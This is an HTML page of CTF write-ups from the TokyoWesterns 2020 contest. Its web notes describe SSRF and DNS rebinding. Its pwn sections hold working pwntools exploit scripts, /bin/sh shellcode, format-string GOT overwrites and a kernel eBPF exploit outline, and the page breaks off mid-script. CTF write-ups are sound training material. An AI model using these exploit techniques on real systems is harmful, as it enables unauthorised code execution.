@@ -1,0 +1,1793 @@
+<!DOCTYPE HTML>
+<!-- This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek). -->
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>TokyoWesterns CTF 6th 2020</title>
+    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
+    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
+    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
+    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
+
+  .sticky-offset {
+      top: 56px;
+  }
+
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+  </style>
+  
+  <script>
+  // https://stackoverflow.com/a/48330533
+  $(window).on('activate.bs.scrollspy', function (event) {
+    let active_collapse = $($('.list-group-item.active').parents()[0]);
+    $(".collapse").removeClass("show");
+    active_collapse.addClass("show");
+
+    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+    $('a[href^="#submenu"]').css("border-left", "");
+    parent_menu.css("border-left","#e69138 solid 4px");
+  });
+
+  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      processEscapes: true
+    }
+  });
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="https://github.com/balsn/ctf_writeup">
+        <img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">balsn / ctf_writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+            
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+        
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                misc
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#birds">birds</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                web
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#urlcheck_v1">urlcheck_v1</a>
+    
+                <a class="dropdown-item" href="#urlcheck_v2">urlcheck_v2</a>
+    
+                <a class="dropdown-item" href="#angular-of-the-universe">angular-of-the-universe</a>
+    
+                <a class="dropdown-item" href="#angular-of-the-universe-(flag-2)">angular-of-the-universe-(flag-2)</a>
+    
+                <a class="dropdown-item" href="#bfnote-(not-solved)">bfnote-(not-solved)</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                pwn
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#extended-extended-berkeley-packet-filter">extended-extended-berkeley-packet-filter</a>
+    
+                <a class="dropdown-item" href="#smash">smash</a>
+    
+                <a class="dropdown-item" href="#nothing-more-to-say-2020">nothing-more-to-say-2020</a>
+    
+                <a class="dropdown-item" href="#blind-shot">blind-shot</a>
+    
+                <a class="dropdown-item" href="#online-nonogram">online-nonogram</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                crypto
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#easy-hash">easy-hash</a>
+    
+                <a class="dropdown-item" href="#twin-d">twin-d</a>
+    
+                <a class="dropdown-item" href="#melancholy-alice">melancholy-alice</a>
+    
+                <a class="dropdown-item" href="#xor-and-shift-encryptor">xor-and-shift-encryptor</a>
+    
+                <a class="dropdown-item" href="#sqrt">sqrt</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                rev
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#reversing-is-amazing">reversing-is-amazing</a>
+    
+                <a class="dropdown-item" href="#tamarin">tamarin</a>
+    
+                <a class="dropdown-item" href="#metal">metal</a>
+    
+              </div>
+            </li>
+    
+        </ul>
+      </div>
+      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
+        <ul class="navbar-nav ml-auto">
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <div class="row" id="body-row">
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <ul class="list-group sticky-top sticky-offset">
+          
+          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">misc</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu0" class="collapse sidebar-submenu">
+            <a href="#birds" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">birds</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">web</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu1" class="collapse sidebar-submenu">
+            <a href="#urlcheck_v1" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">urlcheck_v1</span>
+            </a>
+    
+<a href="#urlcheck_v2" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">urlcheck_v2</span>
+            </a>
+    
+<a href="#angular-of-the-universe" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">angular-of-the-universe</span>
+            </a>
+    
+<a href="#angular-of-the-universe-(flag-2)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">angular-of-the-universe-(flag-2)</span>
+            </a>
+    
+<a href="#bfnote-(not-solved)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">bfnote-(not-solved)</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu2" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">pwn</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu2" class="collapse sidebar-submenu">
+            <a href="#extended-extended-berkeley-packet-filter" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">extended-extended-berkeley-packet-filter</span>
+            </a>
+    
+<a href="#smash" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">smash</span>
+            </a>
+    
+<a href="#nothing-more-to-say-2020" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">nothing-more-to-say-2020</span>
+            </a>
+    
+<a href="#blind-shot" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">blind-shot</span>
+            </a>
+    
+<a href="#online-nonogram" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">online-nonogram</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu3" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">crypto</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu3" class="collapse sidebar-submenu">
+            <a href="#easy-hash" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">easy-hash</span>
+            </a>
+    
+<a href="#twin-d" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">twin-d</span>
+            </a>
+    
+<a href="#melancholy-alice" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">melancholy-alice</span>
+            </a>
+    
+<a href="#xor-and-shift-encryptor" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">xor-and-shift-encryptor</span>
+            </a>
+    
+<a href="#sqrt" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">sqrt</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu4" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">rev</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu4" class="collapse sidebar-submenu">
+            <a href="#reversing-is-amazing" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">reversing-is-amazing</span>
+            </a>
+    
+<a href="#tamarin" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">tamarin</span>
+            </a>
+    
+<a href="#metal" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">metal</span>
+            </a>
+    
+          </div>
+    
+        </ul>
+      </div>
+      <div class="col-10 py-3">
+        <article class="markdown-body"><h1 id="tokyowesterns-ctf-6th-2020"><a class="header-link" href="#tokyowesterns-ctf-6th-2020"></a>TokyoWesterns CTF 6th 2020</h1>
+
+<h2 id="misc"><a class="header-link" href="#misc"></a>Misc</h2>
+<h3 id="birds"><a class="header-link" href="#birds"></a>Birds</h3>
+<p>Connect the airport on map.</p>
+<p><code>TWCTF{FLYTONIHON}</code></p>
+<h2 id="web"><a class="header-link" href="#web"></a>Web</h2>
+<h3 id="urlcheck_v1"><a class="header-link" href="#urlcheck_v1"></a>urlcheck_v1</h3>
+<ul class="list">
+<li>Decimal confusion</li>
+<li><code>http://urlcheck1.chal.ctf.westerns.tokyo/check-status?url=http://0177.0.0.1/admin-status</code></li>
+<li><code>TWCTF{4r3_y0u_r34dy?n3x7_57463_15_r34l_55rf!}</code></li>
+</ul>
+<h3 id="urlcheck_v2"><a class="header-link" href="#urlcheck_v2"></a>urlcheck_v2</h3>
+<ul class="list">
+<li>DNS rebinding</li>
+<li><code>http://36573657.7f000001.rbndr.us/admin-status</code></li>
+<li><code>TWCTF{17_15_h4rd_70_55rf_m17164710n_47_4pp_l4y3r:(}</code></li>
+</ul>
+<h3 id="angular-of-the-universe"><a class="header-link" href="#angular-of-the-universe"></a>Angular of the Universe</h3>
+<ul class="list">
+<li>double encoding</li>
+<li>Angular http will decode it again</li>
+<li><code>echo &#39;GET /\de%62ug/answer HTTP/1.1\r\nHost: universe.chal.ctf.westerns.tokyo\r\nConnection: close\r\n\r\n&#39; | nc 34.97.224.254 80</code></li>
+<li><code>TWCTF{ky0-wa-dare-n0-donna-yume-ni?kurukuru-mewkledreamy!}</code></li>
+</ul>
+<h3 id="angular-of-the-universe-(flag-2)"><a class="header-link" href="#angular-of-the-universe-(flag-2)"></a>Angular of the Universe (flag 2)</h3>
+<ul class="list">
+<li>Angular http determines the destination for <code>http.get(&#39;/api/answer&#39;)</code> based on <code>Host:</code> header</li>
+<li>Angular http follows 302 redirect</li>
+</ul>
+<pre class="hljs"><code><span class="hljs-attribute">Host</span>: my_server
+
+<span class="groovy"><span class="hljs-string">my_server:</span>
+<span class="hljs-number">302</span>
+<span class="hljs-string">Location:</span> <span class="hljs-string">http:</span><span class="hljs-comment">//127.0.0.1/api/true-answer</span></span></code></pre><p><code>TWCTF{you-have-to-eat-tomato-yume-chan!}</code></p>
+<h3 id="bfnote-(not-solved)"><a class="header-link" href="#bfnote-(not-solved)"></a>bfnote (not-solved)</h3>
+<ul class="list">
+<li><p>Unintended solution: <a href="https://github.com/cure53/DOMPurify/commit/02724b8eb048dd219d6725b05c3000936f11d62d#diff-f44bc3a1bfaa31000b8f4f1359dba82aL1078">DOMPurify 0-day</a>, <a href="https://gist.github.com/sqrtrev/9fdd1df15dfce1e92f60308a3bce7723">payload1 by sqrtrev</a>, <a href="https://gist.github.com/terjanq/e2198440c4fdfbdec43e921b600d4a1d#dompurify-bypass">payload2 by terjanq</a></p>
+</li>
+<li><p>Intended solution: Recaptcha-oriented cross-site scripting, <a href="https://gist.github.com/bluepichu/3ea50dfe412d13d9a7cd01e909856e4c#file-bfnote">payload1 by bluepichu</a> <a href="https://gist.github.com/terjanq/e2198440c4fdfbdec43e921b600d4a1d#intended-solution">payload2 by terjanq</a></p>
+</li>
+</ul>
+<h2 id="pwn"><a class="header-link" href="#pwn"></a>Pwn</h2>
+<h3 id="extended-extended-berkeley-packet-filter"><a class="header-link" href="#extended-extended-berkeley-packet-filter"></a>Extended Extended Berkeley Packet Filter</h3>
+<ul class="list">
+<li>Break the verifier
+<code>`</code>
+BPF_LDX_MEM(BPF_DW,6,9,0),</li>
+</ul>
+<p>BPF_MOV64_IMM(8,0x1), 
+BPF_ALU64_IMM(BPF_LSH,8,62), </p>
+<p>BPF_JMP_REG(BPF_JLE,6,8,2), 
+BPF_MOV64_IMM(0,0),
+BPF_EXIT_INSN(),</p>
+<p>BPF_ALU64_IMM(BPF_ALSH, 6, 2),
+BPF_ALU64_IMM(BPF_AND, 6, 4),
+BPF_ALU64_IMM(BPF_RSH, 6, 2),</p>
+<pre class="hljs"><code>The following exploit <span class="hljs-keyword">is</span> similar to CVE<span class="hljs-number">-2020</span><span class="hljs-number">-8835</span> 
+* Leak kernel address
+* Create arbitrary read
+* Traverse init_task to get current task
+* Create arbitary write <span class="hljs-keyword">and</span> overwrite modprobe path to <span class="hljs-string">"/tmp/x"</span>
+* chmod <span class="hljs-number">0777</span> /flag  get cat flag
+* [Exploit](https://github.com/st424204/ctf_practice/tree/master/TokyoWesterns%<span class="hljs-number">20</span>CTF%<span class="hljs-number">206</span>th%<span class="hljs-number">202020</span>/exp)
+
+<span class="hljs-comment">### IL</span>
+* Get arg0 address by <span class="hljs-string">"ldarga"</span>
+* leak <span class="hljs-keyword">return</span> address which permission <span class="hljs-keyword">is</span> rwx
+* Use <span class="hljs-string">"cpblk"</span> to write shellcode at <span class="hljs-keyword">return</span> address <span class="hljs-keyword">and</span> win
+```python=
+<span class="hljs-keyword">import</span> base64
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+
+<span class="hljs-comment">#r = process('./il')</span>
+r = remote(<span class="hljs-string">"pwn02.chal.ctf.westerns.tokyo"</span>, <span class="hljs-number">23541</span>)
+
+
+push_arg0_addr = <span class="hljs-string">b"\xFE\x0A\x00\x00"</span>
+push_int64 = <span class="hljs-string">b"\x21"</span>
+
+add = <span class="hljs-string">b"\x58"</span>
+copy = <span class="hljs-string">b"\xFE\x17"</span>
+push_8 = <span class="hljs-string">b"\x1e"</span>
+push_1 = <span class="hljs-string">b"\x17"</span>
+push_arg0 = <span class="hljs-string">b"\x02"</span>
+assign_arg0 = <span class="hljs-string">b"\x10\x00"</span>
+<span class="hljs-comment">#payload = push_arg0_addr + push_int64 + p64(0x10) + add + push_arg0_addr + push_8 + copy + push_8</span>
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_payload</span><span class="hljs-params">(offset,val)</span>:</span>
+    ret = push_arg0_addr + push_arg0_addr + push_int64 + p64(<span class="hljs-number">0x10</span>) + add + push_8 + copy + push_arg0 + push_int64 + p64(offset) + add  + push_int64 + p64(val) + assign_arg0 +  push_arg0_addr + push_8 + copy 
+    <span class="hljs-keyword">return</span> ret
+
+
+context.arch = <span class="hljs-string">"amd64"</span>
+shellcode = asm(<span class="hljs-string">"""
+xor esi,esi
+mov rbx,0x68732f2f6e69622f
+push rsi
+push rbx
+push rsp
+pop rdi
+push 59
+pop rax
+xor edx, edx
+syscall
+
+"""</span>).ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b"\x90"</span>)
+
+payload = <span class="hljs-string">b""</span>;
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">5</span>):
+    payload+=get_payload(i*<span class="hljs-number">8</span>,u64(shellcode[i*<span class="hljs-number">8</span>:i*<span class="hljs-number">8</span>+<span class="hljs-number">8</span>]))
+payload += push_8
+
+r.sendlineafter(<span class="hljs-string">":"</span>,base64.b64encode(payload))
+r.interactive()
+
+</code></pre><h3 id="smash"><a class="header-link" href="#smash"></a>smash</h3>
+<ul class="list">
+<li>Overwrite return address which in SSP with a heap address</li>
+<li>Put shellcode in heap address</li>
+<li>Because heap address is executable in Pin, overwrite return address is fine</li>
+<li>Win</li>
+</ul>
+<pre class="hljs"><code>from pwn import *
+
+<span class="hljs-comment">#r = process('./run.sh')</span>
+<span class="hljs-comment">#r = process('./smash')</span>
+r = remote(<span class="hljs-string">"pwn01.chal.ctf.westerns.tokyo"</span>, <span class="hljs-number">29246</span>)
+
+<span class="hljs-comment">#r = remote("localhost", 4444)</span>
+
+r.sendlineafter(<span class="hljs-string">"&gt; "</span>,<span class="hljs-string">"%p%p%p%p%p%p%p%p%p%p%p"</span>)
+
+
+data = [ <span class="hljs-keyword">int</span>(<span class="hljs-keyword">x</span>,<span class="hljs-number">16</span>) <span class="hljs-keyword">for</span> <span class="hljs-keyword">x</span> in r.recvline().strip().replace(b<span class="hljs-string">"(nil)"</span>,b<span class="hljs-string">""</span>).<span class="hljs-keyword">split</span>(b<span class="hljs-string">"0x"</span>)[<span class="hljs-number">1</span>:]]
+
+heap = data[<span class="hljs-number">0</span>] - <span class="hljs-number">0x6c0</span>
+code = data[<span class="hljs-number">5</span>] - <span class="hljs-number">0x1216</span>
+stack = data[<span class="hljs-number">4</span>]
+libc = data[<span class="hljs-number">6</span>] - <span class="hljs-number">0x270b3</span>
+
+<span class="hljs-keyword">print</span>(<span class="hljs-string">"heap "</span>+<span class="hljs-keyword">hex</span>(heap))
+<span class="hljs-keyword">print</span>(<span class="hljs-string">"code "</span>+<span class="hljs-keyword">hex</span>(code))
+<span class="hljs-keyword">print</span>(<span class="hljs-string">"stack "</span>+<span class="hljs-keyword">hex</span>(stack))
+<span class="hljs-keyword">print</span>(<span class="hljs-string">"libc "</span>+<span class="hljs-keyword">hex</span>(libc))
+
+alloc_heap = heap+ <span class="hljs-number">0x6d0</span>
+stackbuf = stack-<span class="hljs-number">0x60</span>
+actual_return_address = libc+<span class="hljs-number">0x114a72fe0</span>
+
+<span class="hljs-comment">#input(hex(actual_return_address)+":")</span>
+
+r.sendafter(<span class="hljs-string">"[y/n]"</span>,b<span class="hljs-string">"y"</span>+b<span class="hljs-string">"\x00"</span>*<span class="hljs-number">0x2f</span>+p64(actual_return_address +<span class="hljs-number">0x8</span>)[:-<span class="hljs-number">1</span>])
+
+context.arch = <span class="hljs-string">"amd64"</span>
+
+shellcode = asm(<span class="hljs-string">""</span><span class="hljs-string">"
+xor esi,esi
+mov rbx,0x68732f2f6e69622f
+push rsi
+push rbx
+push rsp
+pop rdi
+push 59
+pop rax
+xor edx, edx
+syscall
+
+"</span><span class="hljs-string">""</span>).ljust(<span class="hljs-number">0x23</span>,b<span class="hljs-string">"\x90"</span>)
+<span class="hljs-comment">#shellcode = b"\xeb\xfe".ljust(0x23,b"\x90")</span>
+<span class="hljs-keyword">print</span>(b<span class="hljs-string">"\x00"</span> in shellcode)
+r.sendafter(<span class="hljs-string">"&gt;"</span>,shellcode+p64(alloc_heap)+b<span class="hljs-string">"\x00"</span>*<span class="hljs-number">5</span>+p64(stackbuf+<span class="hljs-number">0x23</span>-<span class="hljs-number">8</span>)[:-<span class="hljs-number">1</span>])
+
+
+r.interactive()</code></pre><h3 id="nothing-more-to-say-2020"><a class="header-link" href="#nothing-more-to-say-2020"></a>nothing more to say 2020</h3>
+<ul class="list">
+<li>Remote libc-2.27, fmt leak libc</li>
+<li>Fmt changed printf to system</li>
+<li>Input &quot;sh&quot; to get the shell</li>
+</ul>
+<pre class="hljs"><code>#!/usr/bin/env <span class="hljs-keyword">python3</span>
+# -*- codin<span class="hljs-variable">g:</span> utf-<span class="hljs-number">8</span> -*-
+from pwn import *
+import sys
+import time
+import random
+host = <span class="hljs-string">'pwn02.chal.ctf.westerns.tokyo'</span>
+port = <span class="hljs-number">18247</span>
+
+binary = <span class="hljs-string">"./nothing"</span>
+context.binary = binary
+elf = ELF(binary)
+<span class="hljs-keyword">try</span>:
+  libc = ELF(<span class="hljs-string">"./libc.so.6"</span>)
+  <span class="hljs-built_in">log</span>.success(<span class="hljs-string">"libc load success"</span>)
+  system_off = libc.symbols.<span class="hljs-built_in">system</span>
+  <span class="hljs-built_in">log</span>.success(<span class="hljs-string">"system_off = "</span>+hex(system_off))
+excep<span class="hljs-variable">t:</span>
+  <span class="hljs-built_in">log</span>.failure(<span class="hljs-string">"libc not found !"</span>)
+
+<span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.<span class="hljs-built_in">argv</span>) == <span class="hljs-number">1</span>:
+  r = process([binary, <span class="hljs-string">"0"</span>], env={<span class="hljs-string">"LD_LIBRARY_PATH"</span>:<span class="hljs-string">"."</span>})
+
+<span class="hljs-keyword">else</span>:
+  r = remote(host ,port)
+
+def byte2str(s):
+  ss = <span class="hljs-string">""</span>
+  <span class="hljs-keyword">for</span> i in <span class="hljs-variable">s:</span>
+    ss+=chr(i)
+  <span class="hljs-keyword">return</span> ss
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
+  r.recvuntil(<span class="hljs-string">"&gt; "</span>)
+  r.sendline(<span class="hljs-string">"%39$p"</span>)
+  <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.<span class="hljs-built_in">argv</span>) == <span class="hljs-number">1</span>:
+    libc = <span class="hljs-keyword">int</span>(r.recvuntil(<span class="hljs-string">"\n"</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0</span>x270b3
+  <span class="hljs-keyword">else</span> :
+    libc = <span class="hljs-keyword">int</span>(r.recvuntil(<span class="hljs-string">"\n"</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0</span>x000000000021b97
+  <span class="hljs-keyword">print</span>(<span class="hljs-string">"libc = {}"</span>.format(hex(libc)))
+  now = <span class="hljs-number">0</span>
+  fmt = <span class="hljs-string">""</span>
+  fmt2 = <span class="hljs-string">""</span>
+  addr = <span class="hljs-number">0</span>x601028
+  <span class="hljs-built_in">index</span> = <span class="hljs-number">18</span>
+  <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.<span class="hljs-built_in">argv</span>) == <span class="hljs-number">1</span>:
+    <span class="hljs-built_in">system</span> = libc + <span class="hljs-number">0</span>x55410
+  <span class="hljs-keyword">else</span> :
+    <span class="hljs-built_in">system</span> = libc + <span class="hljs-number">0</span>x4f4e0
+  <span class="hljs-keyword">print</span>(<span class="hljs-string">"system = {}"</span>.format(hex(<span class="hljs-built_in">system</span>)))
+  <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):
+    now = (((( <span class="hljs-built_in">system</span> &gt;&gt; (i*<span class="hljs-number">8</span>) ) &amp; <span class="hljs-number">0</span>xff ) - now ) + <span class="hljs-number">0</span>x100) &amp; <span class="hljs-number">0</span>xff
+    fmt += <span class="hljs-string">"%"</span> + str(now) + <span class="hljs-string">"c"</span> + <span class="hljs-string">"%"</span> + str(<span class="hljs-built_in">index</span>+i) + <span class="hljs-string">"$hhn"</span>
+    now = (<span class="hljs-built_in">system</span> &gt;&gt;(i*<span class="hljs-number">8</span>))&amp;<span class="hljs-number">0</span>xff
+    fmt2 += byte2str(p64(addr+i))
+  <span class="hljs-keyword">print</span>(<span class="hljs-built_in">len</span>(fmt))
+  fmt = fmt.ljust(<span class="hljs-number">0</span>x60,<span class="hljs-string">"A"</span>) + fmt2
+  r.recvuntil(<span class="hljs-string">"&gt; "</span>)
+  r.sendline(fmt)
+  r.sendline(<span class="hljs-string">"ls"</span>)
+
+  r.interactive()
+</code></pre><h3 id="blind-shot"><a class="header-link" href="#blind-shot"></a>Blind Shot</h3>
+<ul class="list">
+<li>Fmt string change argv_ptr can overwrite stack.</li>
+<li>Use fmt string %*d to print the count of the lower 4 bytes of main_ret address.</li>
+<li>Modify 2 byte of the  __vdprintf_internal return address to one_gadget.</li>
+<li>( (main return address &amp; 0xffffffff) &lt; 0x80000000) &amp;&amp; (__vdprintf_internal return stack address lower 2 bytes ==  0xc328) , (1/2) * (1/1024) = 1/2048 probability……………</li>
+</ul>
+<pre class="hljs"><code>#!/usr/bin/env python3
+# -*- coding: utf<span class="hljs-number">-8</span> -*-
+from pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">import</span> sys
+<span class="hljs-keyword">import</span> time
+<span class="hljs-keyword">import</span> <span class="hljs-built_in">random</span>
+host = <span class="hljs-string">'pwn01.chal.ctf.westerns.tokyo'</span>
+port = <span class="hljs-number">12463</span>
+
+<span class="hljs-built_in">binary</span> = <span class="hljs-string">"./blindshot"</span>
+context.<span class="hljs-built_in">binary</span> = <span class="hljs-built_in">binary</span>
+elf = ELF(<span class="hljs-built_in">binary</span>)
+<span class="hljs-keyword">try</span>:
+  libc = ELF(<span class="hljs-string">"./libc.so.6"</span>)
+  <span class="hljs-built_in">log</span>.success(<span class="hljs-string">"libc load success"</span>)
+  system_off = libc.symbols.system
+  <span class="hljs-built_in">log</span>.success(<span class="hljs-string">"system_off = "</span>+<span class="hljs-built_in">hex</span>(system_off))
+except:
+  <span class="hljs-built_in">log</span>.failure(<span class="hljs-string">"libc not found !"</span>)
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
+  stack = <span class="hljs-number">0xc328</span>
+  offset = <span class="hljs-number">0xE6CE7</span> - <span class="hljs-number">0x270b3</span>
+  <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:
+    r = remote(host ,port)
+    <span class="hljs-built_in">print</span>(r.recvuntil(<span class="hljs-string">"&gt; "</span>))
+    <span class="hljs-keyword">try</span>:
+      <span class="hljs-built_in">print</span>(<span class="hljs-string">"stack = {}"</span>.format(<span class="hljs-built_in">hex</span>(stack)))
